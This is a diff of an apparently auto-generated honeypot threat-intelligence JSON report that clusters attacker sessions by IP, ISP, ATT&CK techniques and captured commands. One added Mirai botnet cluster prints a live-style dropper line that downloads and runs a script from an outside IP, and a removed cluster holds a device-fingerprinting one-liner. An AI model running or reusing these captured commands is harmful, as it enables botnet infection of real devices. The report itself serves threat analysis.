-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8e2bf7c83c884bea16c83d3b1f776b6e_small_math'\"'\"' \"$((504*9+21))\"'",
-        "(504*9+21",
-        "printf '\\n%s|%s\\n' 'check_8e2bf7c83c884bea16c83d3b1f776b6e_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8e2bf7c83c884bea16c83d3b1f776b6e_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_8e2bf7c83c884bea16c83d3b1f776b6e_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_8e2bf7c83c884bea16c83d3b1f776b6e_arg1'\"'\"' '\"'\"'check_8e2bf7c83c884bea16c83d3b1f776b6e_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8e2bf7c83c884bea16c83d3b1f776b6e_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_8e2bf7c83c884bea16c83d3b1f776b6e_arg1' 'check_8e2bf7c83c884bea16c83d3b1f776b6e_arg2'; printf '\\n%s|%s\\n' 'check_8e2bf7c83c884bea16c83d3b1f776b6e_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_8e2bf7c83c884bea16c83d3b1f776b6e() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8e2bf7c83c884bea16c83d3b1f776b6e_small_function'\"'\"' \"$1|$#\"; }; f_check_8e2bf7c83c884bea16c83d3b1f776b6e '\"'\"'check_8e2bf7c83c884bea16c83d3b1f776b6e_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-3b04ac14085e",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:43:06.386050Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-036",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "4a3a1a83056d57d0",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f29eeda6f486ebdee2ffa9e2b1130727_small_control'\"'\"' '\"'\"'check_f29eeda6f486ebdee2ffa9e2b1130727'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_f29eeda6f486ebdee2ffa9e2b1130727_small_control' 'check_f29eeda6f486ebdee2ffa9e2b1130727'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f29eeda6f486ebdee2ffa9e2b1130727_small_math'\"'\"' \"$((297*388+31))\"'",
-        "(297*388+31",
-        "printf '\\n%s|%s\\n' 'check_f29eeda6f486ebdee2ffa9e2b1130727_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f29eeda6f486ebdee2ffa9e2b1130727_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_f29eeda6f486ebdee2ffa9e2b1130727_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_f29eeda6f486ebdee2ffa9e2b1130727_arg1'\"'\"' '\"'\"'check_f29eeda6f486ebdee2ffa9e2b1130727_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f29eeda6f486ebdee2ffa9e2b1130727_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_f29eeda6f486ebdee2ffa9e2b1130727_arg1' 'check_f29eeda6f486ebdee2ffa9e2b1130727_arg2'; printf '\\n%s|%s\\n' 'check_f29eeda6f486ebdee2ffa9e2b1130727_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_f29eeda6f486ebdee2ffa9e2b1130727() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f29eeda6f486ebdee2ffa9e2b1130727_small_function'\"'\"' \"$1|$#\"; }; f_check_f29eeda6f486ebdee2ffa9e2b1130727 '\"'\"'check_f29eeda6f486ebdee2ffa9e2b1130727_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-4504df28aa69",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:45:05.044054Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-037",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "13a7f85e90488e3a",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_5fe4c7377b3b08d395cdd9678f139287_small_control'\"'\"' '\"'\"'check_5fe4c7377b3b08d395cdd9678f139287'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_5fe4c7377b3b08d395cdd9678f139287_small_control' 'check_5fe4c7377b3b08d395cdd9678f139287'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_5fe4c7377b3b08d395cdd9678f139287_small_math'\"'\"' \"$((621*459+8))\"'",
-        "(621*459+8",
-        "printf '\\n%s|%s\\n' 'check_5fe4c7377b3b08d395cdd9678f139287_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_5fe4c7377b3b08d395cdd9678f139287_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_5fe4c7377b3b08d395cdd9678f139287_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_5fe4c7377b3b08d395cdd9678f139287_arg1'\"'\"' '\"'\"'check_5fe4c7377b3b08d395cdd9678f139287_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_5fe4c7377b3b08d395cdd9678f139287_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_5fe4c7377b3b08d395cdd9678f139287_arg1' 'check_5fe4c7377b3b08d395cdd9678f139287_arg2'; printf '\\n%s|%s\\n' 'check_5fe4c7377b3b08d395cdd9678f139287_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_5fe4c7377b3b08d395cdd9678f139287() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_5fe4c7377b3b08d395cdd9678f139287_small_function'\"'\"' \"$1|$#\"; }; f_check_5fe4c7377b3b08d395cdd9678f139287 '\"'\"'check_5fe4c7377b3b08d395cdd9678f139287_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-fb9ea3d4f142",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:47:05.576143Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-038",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "1a84968cde3d4bd8",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_721377dec261853473fc411f9939e727_small_control'\"'\"' '\"'\"'check_721377dec261853473fc411f9939e727'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_721377dec261853473fc411f9939e727_small_control' 'check_721377dec261853473fc411f9939e727'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_721377dec261853473fc411f9939e727_small_math'\"'\"' \"$((291*957+7))\"'",
-        "(291*957+7",
-        "printf '\\n%s|%s\\n' 'check_721377dec261853473fc411f9939e727_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_721377dec261853473fc411f9939e727_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_721377dec261853473fc411f9939e727_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_721377dec261853473fc411f9939e727_arg1'\"'\"' '\"'\"'check_721377dec261853473fc411f9939e727_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_721377dec261853473fc411f9939e727_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_721377dec261853473fc411f9939e727_arg1' 'check_721377dec261853473fc411f9939e727_arg2'; printf '\\n%s|%s\\n' 'check_721377dec261853473fc411f9939e727_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_721377dec261853473fc411f9939e727() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_721377dec261853473fc411f9939e727_small_function'\"'\"' \"$1|$#\"; }; f_check_721377dec261853473fc411f9939e727 '\"'\"'check_721377dec261853473fc411f9939e727_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-81edde8f1c69",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:49:05.266587Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-039",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "ecca797f8b91459a",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3b494b330ff490406155f5df09d7439e_small_control'\"'\"' '\"'\"'check_3b494b330ff490406155f5df09d7439e'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_3b494b330ff490406155f5df09d7439e_small_control' 'check_3b494b330ff490406155f5df09d7439e'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3b494b330ff490406155f5df09d7439e_small_math'\"'\"' \"$((223*423+46))\"'",
-        "(223*423+46",
-        "printf '\\n%s|%s\\n' 'check_3b494b330ff490406155f5df09d7439e_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3b494b330ff490406155f5df09d7439e_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_3b494b330ff490406155f5df09d7439e_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_3b494b330ff490406155f5df09d7439e_arg1'\"'\"' '\"'\"'check_3b494b330ff490406155f5df09d7439e_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3b494b330ff490406155f5df09d7439e_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_3b494b330ff490406155f5df09d7439e_arg1' 'check_3b494b330ff490406155f5df09d7439e_arg2'; printf '\\n%s|%s\\n' 'check_3b494b330ff490406155f5df09d7439e_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_3b494b330ff490406155f5df09d7439e() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3b494b330ff490406155f5df09d7439e_small_function'\"'\"' \"$1|$#\"; }; f_check_3b494b330ff490406155f5df09d7439e '\"'\"'check_3b494b330ff490406155f5df09d7439e_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-7a6e8f041505",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:51:03.515089Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-040",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "ad684e1bc8dece67",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6123ec82d511c711bcc34c2553af431a_small_control'\"'\"' '\"'\"'check_6123ec82d511c711bcc34c2553af431a'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_6123ec82d511c711bcc34c2553af431a_small_control' 'check_6123ec82d511c711bcc34c2553af431a'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6123ec82d511c711bcc34c2553af431a_small_math'\"'\"' \"$((940*96+36))\"'",
-        "(940*96+36",
-        "printf '\\n%s|%s\\n' 'check_6123ec82d511c711bcc34c2553af431a_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6123ec82d511c711bcc34c2553af431a_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_6123ec82d511c711bcc34c2553af431a_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_6123ec82d511c711bcc34c2553af431a_arg1'\"'\"' '\"'\"'check_6123ec82d511c711bcc34c2553af431a_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6123ec82d511c711bcc34c2553af431a_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_6123ec82d511c711bcc34c2553af431a_arg1' 'check_6123ec82d511c711bcc34c2553af431a_arg2'; printf '\\n%s|%s\\n' 'check_6123ec82d511c711bcc34c2553af431a_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_6123ec82d511c711bcc34c2553af431a() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6123ec82d511c711bcc34c2553af431a_small_function'\"'\"' \"$1|$#\"; }; f_check_6123ec82d511c711bcc34c2553af431a '\"'\"'check_6123ec82d511c711bcc34c2553af431a_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-bcaf9e5abad6",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:52:59.254275Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-041",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "157.245.242.188"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "363fe85774d22d5b",
-      "ttps": [],
-      "representative_commands": [
-        "<action>MSMQ:poc</action>",
-        "<to>http://192.168.10.100/msmq/private$/queuejumper</to>",
-        "<id>uuid:1@00000000-0000-0000-0000-000000000000</id>",
-        "</path>",
-        "<properties se:mustUnderstand=\"1\">",
-        "<expiresAt>20600609T164419</expiresAt>",
-        "<sentAt>20230724T164419</sentAt>",
-        "</properties>",
-        "</se:Header>",
-        "<se:Body></se:Body>"
-      ],
-      "members": [
-        {
-          "session_id": "IR-2beba145e576",
-          "src_ip": "157.245.242.188",
-          "country": "US",
-          "isp": "DigitalOcean, LLC",
-          "command_count": 40,
-          "timestamp": "2026-11-17T07:01:21.928692Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-042",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.78"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "f09cabb6e5196e28",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3ecc3b028188e5f22ad0aaba3985f33c_small_control'\"'\"' '\"'\"'check_3ecc3b028188e5f22ad0aaba3985f33c'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_3ecc3b028188e5f22ad0aaba3985f33c_small_control' 'check_3ecc3b028188e5f22ad0aaba3985f33c'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3ecc3b028188e5f22ad0aaba3985f33c_small_math'\"'\"' \"$((125*242+72))\"'",
-        "(125*242+72",
-        "printf '\\n%s|%s\\n' 'check_3ecc3b028188e5f22ad0aaba3985f33c_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3ecc3b028188e5f22ad0aaba3985f33c_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_3ecc3b028188e5f22ad0aaba3985f33c_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_3ecc3b028188e5f22ad0aaba3985f33c_arg1'\"'\"' '\"'\"'check_3ecc3b028188e5f22ad0aaba3985f33c_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3ecc3b028188e5f22ad0aaba3985f33c_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_3ecc3b028188e5f22ad0aaba3985f33c_arg1' 'check_3ecc3b028188e5f22ad0aaba3985f33c_arg2'; printf '\\n%s|%s\\n' 'check_3ecc3b028188e5f22ad0aaba3985f33c_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_3ecc3b028188e5f22ad0aaba3985f33c() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3ecc3b028188e5f22ad0aaba3985f33c_small_function'\"'\"' \"$1|$#\"; }; f_check_3ecc3b028188e5f22ad0aaba3985f33c '\"'\"'check_3ecc3b028188e5f22ad0aaba3985f33c_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-174320a39987",
-          "src_ip": "92.118.39.78",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 27,
-          "timestamp": "2026-11-17T11:07:00.453491Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-043",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "27deb9f44ea4e994",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_b58ce1b415b694e9781c0c770067486e_small_control'\"'\"' '\"'\"'check_b58ce1b415b694e9781c0c770067486e'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_b58ce1b415b694e9781c0c770067486e_small_control' 'check_b58ce1b415b694e9781c0c770067486e'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_b58ce1b415b694e9781c0c770067486e_small_math'\"'\"' \"$((615*303+14))\"'",
-        "(615*303+14",
-        "printf '\\n%s|%s\\n' 'check_b58ce1b415b694e9781c0c770067486e_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_b58ce1b415b694e9781c0c770067486e_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_b58ce1b415b694e9781c0c770067486e_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_b58ce1b415b694e9781c0c770067486e_arg1'\"'\"' '\"'\"'check_b58ce1b415b694e9781c0c770067486e_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_b58ce1b415b694e9781c0c770067486e_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_b58ce1b415b694e9781c0c770067486e_arg1' 'check_b58ce1b415b694e9781c0c770067486e_arg2'; printf '\\n%s|%s\\n' 'check_b58ce1b415b694e9781c0c770067486e_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_b58ce1b415b694e9781c0c770067486e() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_b58ce1b415b694e9781c0c770067486e_small_function'\"'\"' \"$1|$#\"; }; f_check_b58ce1b415b694e9781c0c770067486e '\"'\"'check_b58ce1b415b694e9781c0c770067486e_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-e4d0dcb28c49",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 27,
-          "timestamp": "2026-11-17T18:54:53.577777Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-044",
       "is_campaign": true,
       "campaign_name": "Mirai/IoT Botnet",
       "campaign_severity": "HIGH",
@@ -1648,105 +635,60 @@
       ],
       "session_count": 1,
       "unique_ips": [
-        "23.132.164.177"
+        "160.119.66.206"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "d99706781e4f95ba",
+      "sequence_hash": "a352676f4f562346",
       "ttps": [
         {
-          "id": "T1059.004",
-          "name": "Unix Shell"
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
         },
         {
-          "id": "T1082",
-          "name": "System Information Discovery"
-        },
-        {
-          "id": "T1592",
-          "name": "Gather Victim Host Info"
+          "id": "T1083",
+          "name": "File & Directory Discovery"
         },
         {
           "id": "T1140",
           "name": "Deobfuscate/Decode Files"
         },
         {
-          "id": "T1105",
-          "name": "T1105"
+          "id": "T1059.004",
+          "name": "T1059.004"
         }
       ],
       "representative_commands": [
-        "echo KW1:$(uname -m):$(cat /sys/class/net/*/address 2>/dev/null|grep -v '^00:00:00:00:00:00$'|head -1|tr -d ':'):$(b=/bin/busybox;[ -r $b ]||b=/usr/bin/busybox;[ -r $b ]||b=/bin/sh;if [ -r $b ];then echo $(dd if=$b bs=1 count=4 2>/dev/null|od -An -tx1|tr -d '",
-        "uname -m",
-        "cat /sys/class/net/*/address 2 > /dev/null | grep -v ^00:00:00:00:00:00$ | head -1 | tr -d :",
-        "')-$(dd if=$b bs=1 skip=18 count=2 2>/dev/null|od -An -tx1|tr -d '",
-        "');else echo none;fi):$(grep -icE 'qemu|kvm|virtualbox|vmware|bochs|xen|hypervisor|bhyve' /proc/cpuinfo):$(awk '/^Seccomp:/{print $2;f=1}END{if(!f)print 0}' /proc/self/status):$(awk '/^NoNewPrivs:/{print $2;f=1}END{if(!f)print 0}' /proc/self/status):$(cut -d' ' -f1 /proc/uptime):$(date +%s):$(awk '/MemTotal/{print $2}' /proc/meminfo):$(grep -c ^processor /proc/cpuinfo)",
-        "grep -icE qemu | kvm | virtualbox | vmware | bochs | xen | hypervisor | bhyve /proc/cpuinfo",
-        "awk /^Seccomp:/{print $2",
-        "f=1}END{if( ! f",
-        "awk /^NoNewPrivs:/{print $2",
-        "f=1}END{if( ! f"
+        "enable",
+        "linuxshell",
+        "system",
+        "sh",
+        "ls /home; /bin/busybox BOTNET",
+        "cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&"
       ],
       "members": [
         {
-          "session_id": "IR-16ddd917bfb3",
-          "src_ip": "23.132.164.177",
-          "country": "DE",
-          "isp": "10GIG.HOST",
-          "command_count": 12,
-          "timestamp": "2026-11-17T16:53:59.246805Z"
+          "session_id": "IR-f000ccc23c7d",
+          "src_ip": "160.119.66.206",
+          "country": "NL",
+          "isp": "HostMem",
+          "command_count": 6,
+          "timestamp": "2026-11-18T01:20:34.520418Z"
         }
       ]
     },
     {
-      "cluster_id": "CLU-045",
+      "cluster_id": "CLU-017",
       "is_campaign": false,
       "campaign_name": null,
       "campaign_severity": null,
       "campaign_description": null,
       "matched_campaigns": [],
-      "session_count": 1,
+      "session_count": 3,
       "unique_ips": [
-        "157.245.242.188"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "e707cc0f441aefd0",
-      "ttps": [],
-      "representative_commands": [
-        "From: <sip:nm@nm>;tag=root",
-        "To: <sip:nm2@nm2>",
-        "Call-ID: 50000",
-        "CSeq: 42 OPTIONS",
-        "Max-Forwards: 70",
-        "Content-Length: 0",
-        "Contact: <sip:nm@nm>",
-        "Accept: application/sdp"
-      ],
-      "members": [
-        {
-          "session_id": "IR-d96e5abd1425",
-          "src_ip": "157.245.242.188",
-          "country": "US",
-          "isp": "DigitalOcean, LLC",
-          "command_count": 8,
-          "timestamp": "2026-11-17T07:01:07.239165Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-046",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 6,
-      "unique_ips": [
-        "217.60.240.247",
         "138.124.124.210",
-        "138.124.124.212",
-        "217.60.240.6"
+        "138.124.116.194"
       ],
-      "unique_ip_count": 4,
+      "unique_ip_count": 2,
       "sequence_hash": "bf1c9b4a861be0d0",
       "ttps": [],
       "representative_commands": [
@@ -1757,79 +699,73 @@
       ],
       "members": [
         {
-          "session_id": "IR-dfc5b44d9016",
-          "src_ip": "138.124.124.212",
+          "session_id": "IR-3a7eecc3f25f",
+          "src_ip": "138.124.116.194",
           "country": "FI",
           "isp": "AEZA GROUP LLC",
           "command_count": 4,
-          "timestamp": "2026-11-17T06:20:58.132730Z"
+          "timestamp": "2026-11-18T03:35:40.563663Z"
         },
         {
-          "session_id": "IR-f4f4c5442a56",
+          "session_id": "IR-007d48c3c4ca",
           "src_ip": "138.124.124.210",
           "country": "FI",
           "isp": "AEZA GROUP LLC",
           "command_count": 4,
-          "timestamp": "2026-11-17T06:22:33.314736Z"
-        },
-        {
-          "session_id": "IR-357cb1222ad2",
-          "src_ip": "217.60.240.6",
-          "country": "DE",
-          "isp": "Awas.ovh - Germany, Frankfurt",
-          "command_count": 4,
-          "timestamp": "2026-11-17T13:30:48.733670Z"
-        },
-        {
-          "session_id": "IR-09d7825d276f",
-          "src_ip": "217.60.240.247",
-          "country": "DE",
-          "isp": "Awas.ovh - Germany, Frankfurt",
-          "command_count": 4,
-          "timestamp": "2026-11-17T13:41:34.401815Z"
-        },
-        {
-          "session_id": "IR-c75cbb59cf42",
-          "src_ip": "138.124.124.210",
-          "country": "FI",
-          "isp": "AEZA GROUP LLC",
-          "command_count": 4,
-          "timestamp": "2026-11-17T13:44:49.375592Z"
+          "timestamp": "2026-11-18T03:41:49.017430Z"
         }
       ]
     },
     {
-      "cluster_id": "CLU-047",
+      "cluster_id": "CLU-018",
       "is_campaign": false,
       "campaign_name": null,
       "campaign_severity": null,
       "campaign_description": null,
       "matched_campaigns": [],
-      "session_count": 1,
+      "session_count": 3,
       "unique_ips": [
-        "199.165.159.129"
+        "35.206.160.252",
+        "35.210.233.15",
+        "35.210.240.68"
       ],
-      "unique_ip_count": 1,
-      "sequence_hash": "23324325c4a89b7b",
+      "unique_ip_count": 3,
+      "sequence_hash": "525eaacb33b1f0dd",
       "ttps": [],
       "representative_commands": [
-        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
-        "Accept: */*",
-        "Accept-Encoding: gzip"
+        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+        "Accept-Encoding: gzip",
+        "Connection: close"
       ],
       "members": [
         {
-          "session_id": "IR-316e9a246aa6",
-          "src_ip": "199.165.159.129",
-          "country": "US",
-          "isp": "The Shadowserver Foundation, Inc.",
+          "session_id": "IR-23b8be1bc5f3",
+          "src_ip": "35.210.233.15",
+          "country": "BE",
+          "isp": "Google LLC",
           "command_count": 3,
-          "timestamp": "2026-11-17T12:10:44.057954Z"
+          "timestamp": "2026-11-18T03:27:00.454997Z"
+        },
+        {
+          "session_id": "IR-2fdc1252d5e7",
+          "src_ip": "35.206.160.252",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 3,
+          "timestamp": "2026-11-18T03:40:34.074995Z"
+        },
+        {
+          "session_id": "IR-4532000b0da1",
+          "src_ip": "35.210.240.68",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 3,
+          "timestamp": "2026-11-18T04:03:58.205766Z"
         }
       ]
     },
     {
-      "cluster_id": "CLU-048",
+      "cluster_id": "CLU-019",
       "is_campaign": true,
       "campaign_name": "mdrfckr SSH Key Injection",
       "campaign_severity": "HIGH",
@@ -1848,38 +784,20 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 49,
+      "session_count": 17,
       "unique_ips": [
-        "101.96.195.17",
-        "43.165.190.208",
-        "202.165.25.43",
-        "68.210.120.110",
-        "96.78.175.36",
-        "51.178.43.161",
-        "103.172.236.15",
-        "128.1.198.78",
-        "181.48.105.218",
-        "117.50.51.198",
-        "103.248.120.6",
-        "203.145.143.163",
-        "72.240.125.133",
-        "220.247.224.226",
-        "106.12.9.42",
-        "171.244.201.80",
-        "103.176.20.115",
-        "4.221.162.168",
-        "159.223.97.218",
-        "73.241.158.44",
-        "150.136.104.48",
-        "103.195.236.196",
-        "46.101.137.209",
-        "94.182.168.149",
-        "113.161.79.218",
-        "107.161.82.45",
-        "107.189.23.48",
-        "114.217.10.60"
+        "14.103.123.67",
+        "43.157.200.91",
+        "50.6.241.208",
+        "152.32.218.149",
